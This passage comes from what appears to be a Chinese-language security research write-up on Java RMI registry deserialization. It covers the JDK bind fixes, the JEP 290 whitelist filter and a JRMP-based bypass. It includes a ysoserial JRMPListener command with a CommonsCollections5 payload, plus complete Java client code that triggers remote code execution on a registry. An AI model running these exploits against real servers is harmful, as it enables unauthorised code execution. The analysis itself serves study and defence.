        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1329)
        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1970)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1895)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1777)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1329)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:349)
        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:390)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:248)
        at sun.rmi.transport.Transport$1.run(Transport.java:159)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)
        at java.lang.Thread.run(Thread.java:695)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:275)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:252)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:378)
        at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)
        at Client.main(Client.java:55)
这一段即注册中心传递过来的错误，我们先看看当注册中心处理请求时，遇到报错的处理方式，前面说了，注册中心会在处理请求时，会调用到UnicastServerRef#dispatch来处理请求，这里会调用RegistryImpl_Skel#dispatch来处理请求：
重点关注红框框起来的这几段，首先是把异常赋值给了var6，之后会获取到当前socket连接到outputstream，然后写入异常，之后通过finally后边的两段代码把数据回传给客户端。
这里应该很好理解，难点是我们要如何手动的抛出一个异常，并把命令执行的结果带入异常中。
本来想找一找有没有办法可以实现不通过throws来抛出异常，但是似乎没有办法。。所以只能通过网上流传的POC，用URLClassLoader的方式来加载类。
当通过bind方法让注册中心反序列化我们的恶意序列化对象时，即可触发命令执行，通过URLClassLoader的方式加载远程jar，并调用其方法，在方法内抛出错误，错误会传回客户端。
参考：
在做这个的时候遇到了一点问题，python自启的服务器不知道为什么没法成功被加载，只能用vps，第二个问题就是java版本的问题，如果服务器的jdk版本太高，编译的jar时用的jdk版本太低，就无法兼容，会报出一个java.lang.UnsupportedClassVersionError的错误。
# 针对RMI反序列化JDK做的一些调整
## bind && unbind && rebind
前面说了，在低版本JDK中，是可以注册中心和服务端不在一台服务器上的。
在后边修了第一次，在RegistryImpl#bind中添加了一个checkAccess方法，来检验你的来源是否为localhost。
此时我们虽然不能在注册中心注册服务，然而还是可以成功反序列化。这是因为注册中心在调用RegistryImpl#bind方法前就已经将我们传来的数据反序列化了。
而在JDK8u141后，又修了一次，这次彻底解决掉在bind时反序列化的问题。
## JEP 290 & 绕过JEP290进行攻击
### 什么是JEP290
JEP290是Java为了应对反序列化而设置的一种过滤器，理想状态是让开发者只反序列化其想反序列化的类，这样我们使用类似CC这样的，就会因为无法反序列化Tranformer、HashMap等，从而没法触发漏洞。
JEP290中对RMI设置了默认的过滤器（sun.rmi.registry.RegistryImpl#registryFilter）：
    private static Status registryFilter(FilterInfo var0) {
            if (registryFilter != null) {
                Status var1 = registryFilter.checkInput(var0);
                if (var1 != Status.UNDECIDED) {
                    return var1;
                }
            }
            if (var0.depth() > (long)REGISTRY_MAX_DEPTH) {
                return Status.REJECTED;
            } else {
                Class var2 = var0.serialClass();
                if (var2 == null) {
                    return Status.UNDECIDED;
                } else {
                    if (var2.isArray()) {
                        if (var0.arrayLength() >= 0L && var0.arrayLength() > (long)REGISTRY_MAX_ARRAY_SIZE) {
                            return Status.REJECTED;
                        }
                        do {
                            var2 = var2.getComponentType();
                        } while(var2.isArray());
                    }
                    if (var2.isPrimitive()) {
                        return Status.ALLOWED;
                    } else {
                        return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
                    }
                }
            }
        }
从代码中可以发现，这个过滤器设置了白名单，他会判断你要反序列化的类（或者反序列化类的父类）是否在以下列表中（仅用于RmiRegistry）：
    String.class
    Remote.class
    Proxy.class
    UnicastRef.class
    RMIClientSocketFactory.class
    RMIServerSocketFactory.class
    ActivationID.class
    UID.class
如果不在，则会标记为REJECTED，此时不会反序列化成功，反之则标记为ALLOWED，此时则可以反序列化成功。
JEP290本身是JDK9的产物，但是Oracle官方做了向下移植的处理，把JEP290的机制移植到了以下三个版本以及其修复后的版本中：
  * Java? SE Development Kit 8, Update 121 (JDK 8u121)
  * Java? SE Development Kit 7, Update 131 (JDK 7u131)
  * Java? SE Development Kit 6, Update 141 (JDK 6u141)
参考：[JEP 290: Filter Incoming Serialization
Data](https://openjdk.java.net/jeps/290)
### 调用栈
    registryFilter:427, RegistryImpl (sun.rmi.registry)
    checkInput:-1, 2059904228 (sun.rmi.registry.RegistryImpl$$Lambda$2)
    filterCheck:1239, ObjectInputStream (java.io)
    readProxyDesc:1813, ObjectInputStream (java.io)
    readClassDesc:1748, ObjectInputStream (java.io)
    readOrdinaryObject:2042, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    dispatch:76, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:468, UnicastServerRef (sun.rmi.server)
    dispatch:300, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 714624149 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
这里我们要明白的是，JEP290是一种机制，并不是特意为RMI准备的，之是其默认对RMI设置了过滤器，所以才会对RMI的反序列化造成影响。
从上述调用栈中可以发现，实际上是在反序列化时，会调用到readObject，而JEP290的方式，是在readObject中新增了一个filter，在filter中进行过滤。
这里首先会判断有没有设置filter，如果有的话，则调用checkInput方法进行验证，如果验证不通过则直接另status为REJECTED，此时则无法正常进行反序列化。由于是内置在readObject里的，所以任何类反序列化时都会调用到这个检查。这也是为什么他会递归所有对象成员进行检查的原因。
接着我们需要找一下RMI中是如何设置filter的，这个点我找了好久，也是因为自己太不仔细的原因，JEP290是需要人工自己去设置的，而我找在哪设置filter，就是想知道为什么其他地方的readObject不需要调用这个filter进行检查，也就是想搞明白我是在哪一次反序列化会调用到这个filter进行检查。
可以先看下网上说的：
这里说了给了两种方案来设置，第一种不是，那自然就是第二种，通过setObjectInputFilter来设置filter，我下载了jdk8u131中rt.jar包的内容，丢到jadx反编译，可以搜到这个关键字：
最后一行UnicastServerRef应该很熟悉，但是当时没记起来，导致卡了好半天...，跟入这个函数：
UnicastServerRef#unmarshalCustomCallData
在这里可以发现，他设置UnicastServerRef的filter变量作为objectInput的filter，接着可以找在哪设置了UnicastServerRef的filter变量：
在创建注册中心时，将前边说的registryFilter传入进去，而8u121之后的修复版本中，UnicastServerRef多了一个构造方法：
这个构造方法用于设置filter变量。
接着就是找unmarshalCustomCallData这个点在哪被调用了：
UnicastServerRef#olddispatch
在这里调用了unmarshalCustomCallData方法，为socket传来的inputStream设置了filter，当inputStream反序列化时，就会调用这个filter进行过滤。这里是客户端或服务端远程获取注册中心时，触发RegistryImpl_Skel的最后一步，下面会直接进入RegistryImpl_Skel#dispatch去反序列化对象：
在这里，会读取刚刚设置过filter的inputStream，并反序列化，此时filter已经设置上了，所以这也是我们没有办法用之前的链直接打注册中心的原因。
对比一下7u80和8u131获取到的Registry有什么不同：
  * 7u80
  * 8u131
不难发现在8u131多了一个filter和几个无关变量，至此，反序列化时为什么会触发filter，在哪设置的filter都已经搞清楚了，接下来就是如何绕过了。
参考：[Java反序列化之readObject分析](https://blog.kaibro.tw/2020/02/23/Java反序列化之readObject分析/)、[Java
RMI反序列化知识详解](https://paper.seebug.org/1194/#unicastref)
### ByPass JEP290-RMI
#### 测试环境
  * JDK 8u131
如果想要在RMI中Bypass JEP290的限制，思路很明确，我们需要从上面白名单的类或者他们的子类中寻找复写readObject利用点。
#### UnicastServerRef（JDK<=8u231）
我们通过getRegistry时获得的注册中心，其实就是一个封装了UnicastServerRef对象的对象：
当我们调用bind方法后，会通过UnicastRef对象中存储的信息与注册中心进行通信：
这里会通过ref与注册中心通信，并将绑定的对象名称以及要绑定的远程对象发过去，注册中心在后续会对应进行反序列化，这个前面说过了，就不再重复了。
写上面这一段并不是想写如何攻击客户端，而是想说明，注册中心、 **客户端两者之间** 的通信是依赖于UnicastRef中的LiveRef的。
接着来看看yso中的JRMPClient：
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
    Registry.class
    }, obj);
    return proxy;
这里返回了一个代理对象，上面用的这些类都在白名单里，当注册中心反序列化时，会调用到RemoteObjectInvacationHandler父类RemoteObject的readObject方法（因为RemoteObjectInvacationHandler没有readObject方法），在readObject里的最后一行会调用ref.readExternal方法，并将ObjectInputStream传进去：
    ref.readExternal(in);
UnicastRef#readExternal
    public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException {
        this.ref = LiveRef.read(var1, false);
    }
LiveRef#read：
这里在上边会把LiveRef对象还原，LiveRef对象中存了我们序列化进去的ip和端口，之后会调用DGCClient#registerRefs，但是不是在这里调用，是在外边经过一系列转换之后才会调到。
var这里转回来的是一个DGCClient对象，里边同样封装了我们的端口信息，重点关注registerRefs：
这里会调到DGCClient#makeDirtyCall，并把var2传进去，var2里封装了我们的endpoint信息，继续跟：
这里会进到dirty方法中，var4是我们传进去的ObjID对象，var2不知道是什么，var1是一个HashSet对象，里边存了我们的Endpoint信息。
dirty函数应该很熟悉了：
看到这个函数的代码有木有感觉很熟悉，在客户端与服务端进行通信时，也会调用这么一个类似的方法，var6写入的两个Object是否就像是当时客户端调用服务端远程对象的方法时写入的方法名以及参数是一样的？
这里wirteObject后，会用invoke将数据发出去，接着看下边的代码：
这里从socket连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置filter，所以这里可以直接导致注册中心rce，只要我们可以伪造一个socket连接并不把我们恶意序列化的对象发过去。
yso已经替我们做好了这一切，我们可以直接使用命令起一个恶意的服务端：
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "COMMAND"
这里的cc要用对应版本可以用的，这里指的对应版本是jdk8，cc1在jdk8就不可用，所以要选其他链，当我们起了恶意的服务端后，用客户端发起一个bind请求，即可触发反序列化，从而触发RCE：
对应的客户端代码：
    import sun.rmi.server.UnicastRef;
    import sun.rmi.transport.LiveRef;
    import sun.rmi.transport.tcp.TCPEndpoint;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Proxy;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.ObjID;
    import java.rmi.server.RemoteObjectInvocationHandler;
    import java.util.Random;
    public class Client {
        public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {
            Registry reg = LocateRegistry.getRegistry("localhost",8888);
            ObjID id = new ObjID(new Random().nextInt()); // RMI registry
            TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1099);
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
            RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
            Registry proxy = (Registry) Proxy.newProxyInstance(Client.class.getClassLoader(), new Class[] {
                    Registry.class
            }, obj);
            reg.bind("test12",proxy);
        }
    }
这里用bind方法只是举个例子，任意能让客户端反序列化我们传过去的数据的方法都是ok的，比如lookup、unbind、rebind等。
* * *